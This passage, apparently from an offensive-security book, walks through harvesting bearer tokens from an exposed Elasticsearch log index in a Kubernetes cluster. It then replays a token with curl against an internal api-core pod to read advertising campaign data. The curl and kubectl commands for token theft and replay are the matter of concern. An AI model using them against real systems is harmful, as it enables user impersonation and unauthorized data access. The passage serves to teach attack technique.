Interestingly the HTTP message we retrieved carries an authorization token, probably to identify the user requesting the data. We can zero in on all the tokens stored in the log index by applying the proper search filter in Elasticsearch: message:Authorization. This should allow us to gather enough tokens to impersonate all currently active users on the dashboard application:

```
shell> curl "10.20.86.24:9200/log/_search?pretty&size=12&q=message:Authorization"

"_timestamp": 1600579234
"message": "...Host: api-core\nAuthorization Bearer 8b35b04bebd34c1abb247f6baa5dae6c..."

"_timestamp": 1600581600
"message": "...Host: api-core\nAuthorization Bearer 9947c7f0524965d901fb6f43b1274695..."
--snip--
```

Good, we have over a dozen tokens used in the last 12 hours to access the dashboard app and, by extension, the api-core pods. Hopefully some of them will still be valid and can be used for a replay attack.

We can reach the pods behind the api-core service name thanks to Kube's automatic DNS resolution. Alternatively, we can always just pull one of the pods' IP address, like so:

```
shell> kubectl get pods -o wide | grep "api-core"

NODE    ip-192-168-162-215.eu-west-1.compute.internal
POD     api-core-deployment-d34c-7qxm
PODIP   10.0.2.34
PORT    8080
```

We replay a random URL we extracted from the audit index, complete with its authorization token:

```
shell> curl http://10.0.2.34/api/dashboard/campaign/1395412512 \
-H "Authorization: Bearer 8b35b04bebd34c1abb247f6baa5dae6c"
{
  "progress": "0.3",
  "InsertionID": "12387642",
  "creative": "s4d.mxrads.com/7bcdfe206ed7c1159bb0152b7/...",
  "capping": "40",
  "bidfactor": "10",
--snip--
```

We’re in! We may not have access to the pretty dashboards to visualize these metrics—not yet anyway—but we finally caught a glimpse of partial raw campaign data. Bonus: we retrieved the location of video files and images served in ads ①. Let’s take a look at that URL:

```
root@Point1:/# getent -t hosts s4d.mxrads.com
13.225.38.103   s4d.mxrads.com.s3.amazonaws.com
```